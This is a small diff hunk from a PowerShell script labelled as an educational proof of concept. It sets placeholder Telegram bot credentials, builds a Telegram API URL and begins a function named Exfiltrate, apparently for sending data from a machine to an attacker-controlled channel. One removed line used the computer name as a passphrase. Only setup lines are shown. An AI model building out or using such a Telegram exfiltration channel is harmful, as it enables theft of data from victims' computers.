@@ -34,7 +34,6 @@ THIS SCRIPT IS A PROOF OF CONCEPT FOR EDUCATIONAL PURPOSES ONLY.
 
 $Token = "TOKEN_HERE"
 $ChatID = "CHAT_ID_HERE"
-$PassPhrase = "$env:COMPUTERNAME"
 $URL='https://api.telegram.org/bot{0}' -f $Token 
 
 Function Exfiltrate {
